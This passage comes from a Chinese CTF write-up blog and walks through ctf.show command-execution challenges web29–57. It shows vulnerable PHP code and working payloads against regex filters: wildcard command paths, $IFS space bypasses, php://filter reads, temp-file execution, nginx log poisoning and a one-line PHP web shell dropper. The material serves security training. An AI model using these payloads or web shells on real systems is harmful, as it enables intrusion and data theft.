href="#方法一-使用bin目录下的base64命令-来代替字符" class="headerlink" title="方法一 使用bin目录下的base64命令 ?来代替字符"></a>方法一 使用bin目录下的base64命令 ?来代替字符</h2><p>这里想使用的知识点是：<code>/bin/base64 flag.php</code><br>先介绍一下，在/bin目录下有若干个命令可以使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等</span><br></pre></td></tr></table></figure><p>但是这里过滤了字符，不能直接用，因此我们可以借助通配符中的问号来完成payload。<br>即<code>/???/????64</code>因为没有过滤掉数字，所以可以通过64来找到base64命令。当然，文件名也是可以使用？表示的。<br>payload：<code>/???/????64 ????.???</code>后面这串代表的<code>flag.php</code>。将得到的字符串base64解密即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679811886497-dc470501-ef71-466c-b5cf-70e724650d0a.png" alt="image.png"><br>但是如何知道文件名是<code>flag.php</code>的这里并没有提到。</p><h2 id="方法二-使用bzip2下载文件-？来代替字符"><a href="#方法二-使用bzip2下载文件-？来代替字符" class="headerlink" title="方法二 使用bzip2下载文件 ？来代替字符"></a>方法二 使用bzip2下载文件 ？来代替字符</h2><p>除了<code>/bin</code>地址下，<code>/usr/bin</code>下也有执行命令。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb、wget等</span><br></pre></td></tr></table></figure><p>因此，我们也可以像方法一中选择具有数字的方法来使用，比如：<br><code>/usr/bin/bzip2 flag.php</code><br>修改为payload：<code>/???/???/????2 ????.???</code>，压缩之后，查询发现bzip2方法压缩的文件名称后缀为<code>.bz2</code><br>因此我们访问文件下载即可<code>/flag.php.bz2</code>，在本地解压打开即可：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679813512843-4296f544-86a6-4c74-a04e-ebd399b198ef.png" alt="image.png"></p><h2 id="方法三-“-”的妙用"><a href="#方法三-“-”的妙用" class="headerlink" title="方法三 “.”的妙用"></a>方法三 “.”的妙用</h2><blockquote><p><a href="https://blog.sina.com.cn/s/blog_af68a2c201016nh2.html">https://blog.sina.com.cn/s/blog_af68a2c201016nh2.html</a></p></blockquote><p>source命令，也就是.命令，可以通过<code>. file</code>来执行命令，因此这题我们可以通过post上传文件来执行命令。<br>当我们上传文件之后，文件会被保存在<code>/tmp</code>下，文件名称为随机构成的六个字符。因此可以使用<code>/???/??????</code>来匹配文件，但是临时文件有很多，这样没有办法精准地找到需要的文件。<br>这篇文章给出了解决方案：</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p></blockquote><p>在tmp临时文件中，只有php生成的文件是包含大写字母的，其余都是小写字母，因此我们可以加一个过滤大写字母的正则表达式，但是由于不一定一定会生成大写字母，因此需要多次尝试。<br>过滤出大写字母正常来说应该按照如下来写：<code>/???/????????[A-Z]</code>，但是这题里面过滤掉了字符，因此只能用A前面的字符和Z后面的字符（ASCII表），也就是：<code>/???/????????[@-[]</code>。<br>我们应该如何上传文件呢。<br>比较复杂的办法就是自己构造post内容写，比较简单的就是借助工具。<br>在本地写一个简单的html文件（将地址修改为目标地址）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://d3b49897-da81-47f9-8495-e017b7cf25e7.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>本地运行文件，然后上传即可。<br>修改上传文件内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">cat flag.php</span><br></pre></td></tr></table></figure><p>注意途中要抓包，这样才更方便修改。<br>修改get传参<code>/?c=. /???/????????[@-[]</code>，我们可以先修改文件内容来ls一下查看文件：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679817166939-6c78d5c4-63c2-4473-9416-6b24f0bff2bc.png" alt="image.png"><br>cat访问文件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679817244688-04f1315d-5f3a-4305-a1fc-68a7850e8dc0.png" alt="image.png"><br>注意，有的时候没有回显是因为文件末尾并不是大写字母，需要多尝试两遍。</p><h1 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同理，使用上一题第三种方法上传文件即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680162642108-4d1c4acd-baaa-40e9-9e8d-669a726c41d8.png" alt="image.png"></p><h1 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h1><blockquote><p><a href="https://blog.csdn.net/qq_46091464/article/details/108563368">https://blog.csdn.net/qq_46091464/article/details/108563368</a><br><a href="https://blog.csdn.net/weixin_45551083/article/details/110096787">https://blog.csdn.net/weixin_45551083/article/details/110096787</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跑一下剩余字符：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680166455656-158b002d-4a51-46d1-a26e-4f05df0a938a.png" alt="image.png"><br>题目的意思就是让我们使用剩余的这些字符凑出一个36出来。我们先看一下payload是什么：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><p>我们在linux中尝试一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680166804307-4e25e785-2fda-487e-9e77-1a53dc2711aa.png" alt="image.png"><br>为什么会这样呢？我们分析一下，我们先要知道这其中的几个基础结构：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;_&#125;:代表上一次命令执行的结果</span><br><span class="line">$(()): 做运算</span><br></pre></td></tr></table></figure><p>知道了基础，然后我们结合数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(($&#123;_&#125;))=<span class="number">0</span></span><br><span class="line">$((~$(($&#123;_&#125;))))=-<span class="number">1</span></span><br></pre></td></tr></table></figure><p>然后直接使用脚本跑就行，需要36，那么就传入37然后再减一就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">&quot;$((~$((&quot;</span>+<span class="string">&quot;$((~$(())))&quot;</span>*<span class="number">37</span>+<span class="string">&quot;))))&quot;</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web29-41命令执行篇（一）</title>
      <link href="/2023/03/15/web29-41%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2023/03/15/web29-41%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很简单的一道题。<code>?c=system(&quot;ls&quot;);</code>查看一下发现flag.php就在当前目录下，因为过滤了flag字节，所以直接用f*代替就行<br>payload：<code>?c=system(&quot;cat f*&quot;);</code><br>flag在源代码中。</p><h2 id="其他解法"><a href="#其他解法" class="headerlink" title="其他解法"></a>其他解法</h2><ul><li>除此之外，我们可以将文件复制一份修改为其他名字。</li></ul><p>payload：<code>?c=system(&quot;cp f* a.txt&quot;);</code><br>然后直接访问或者cat访问都可以获得flag。</p><ul><li><p>或者使用<code>tac</code>从后往前输出内容<br><code>c=system(&quot;tac f*&quot;);</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678683262006-674f9d23-a923-4232-b54e-03a16b60eacc.png" alt="image.png"></p></li><li><p>除了使用system函数执行，也可以使用内敛执行：<code>echo </code>命令<code> 比如`c=echo `tac f*</code></p></li><li><p>看了wp发现还有几种解法比如：利用参数输入+eval/include</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls%20/&quot;</span>);</span><br><span class="line"></span><br><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure></li><li><p>或者上传木马：<code>file_put_contents(&quot;alb34t.php&quot;,%20%27&lt;?php%20eval($_POST[&quot;cmd&quot;]);%20?&gt;%27);</code></p></li><li><p>hint中使用了另一种命令和绕过：<code>nl fl&#39;&#39;ag.php</code></p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>cat打开后php文件不会显示在页面上，因此需要f12查看源代码。</p></li></ul><h1 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>upload：<code>?c=echo </code>tac f*<code>;</code></p><h1 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>空格过滤常用以下方法绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$<span class="number">9</span>flag.txt <span class="comment">//9改成其他数字也行</span></span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat%<span class="number">09</span>flag.txt</span><br><span class="line">cat%<span class="number">20</span>flag.txt <span class="comment">//这个这里好像不行</span></span><br></pre></td></tr></table></figure><p>payload：<code>?c=echo%09</code>tac%09f*<code>;</code></p><h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>upload：<code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678685067177-79d4d744-a673-436a-ac56-1be9a06a0803.png" alt="image.png"></p><h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><blockquote><p><a href="https://ctf.show/writeups/865962">https://ctf.show/writeups/865962</a></p></blockquote><p>初次之外，wp中还有一种在log中注入木马的方式。在User-Agent<br>中写入木马<code>&lt;?php phpinfo();?&gt;</code>，在c中传入能正常访问的值，我们根据请求头可以判断出是nginx服务器，服务器的默认日志地址为：<code>/var/log/nginx/access.log </code>，再加上这里的include的字段，我们可以得到以下payload：<code>?c=include$_GET[a]?%3E&amp;a=../../../../var/log/nginx/access.log</code>，日志页面中出现phpinfo()页面，插入木马成功。</p><h1 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>upload：<code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h1 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>upload：<code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h1 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>upload：<code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h1 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了数字，把1改为a就能接着用。<br>upload：<code>?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h1 id="web37-data伪协议文件名base64"><a href="#web37-data伪协议文件名base64" class="headerlink" title="web37 data伪协议文件名base64"></a>web37 data伪协议文件名base64</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span 